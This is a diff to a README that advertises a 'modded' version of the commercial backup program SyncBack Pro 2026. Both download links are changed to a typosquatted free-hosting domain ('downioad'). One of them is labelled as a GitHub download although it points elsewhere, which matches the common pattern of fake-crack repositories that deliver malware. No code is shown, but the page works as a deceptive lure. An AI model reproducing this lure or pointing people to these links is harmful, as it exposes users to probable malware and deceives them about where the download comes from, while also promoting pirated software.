@@ -2,7 +2,7 @@
 
 This repository provides a modded tool for SyncBack Pro 2026, offering an enhanced backup and synchronization solution for Windows desktops. Designed for users seeking advanced features, this tool streamlines data management with improved performance and additional utilities, making it ideal for both personal and small business use.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -58,7 +58,7 @@ You can report issues or seek help through the GitHub Issues page of this reposi
 
 For the latest version of SyncBack Pro 2026 Ultimate Backup Suite, please visit the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
